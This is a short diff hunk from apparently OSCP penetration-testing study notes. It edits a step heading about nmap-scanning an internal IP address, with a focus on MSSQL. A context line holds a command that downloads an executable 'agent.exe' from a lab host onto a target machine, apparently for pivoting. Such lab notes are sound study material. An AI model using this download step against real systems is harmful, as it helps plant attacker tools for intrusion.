@@ -15,7 +15,7 @@ wget http://192.168.45.173/agent.exe -outfile agent.exe<br>
 
 ![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/2.png?raw=true)
 
-5. nmap
+5. nmap the internal Ip address (We will focus on MSSQL in this example)
 
 ![imane alt](https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/3.png?raw=true)
 
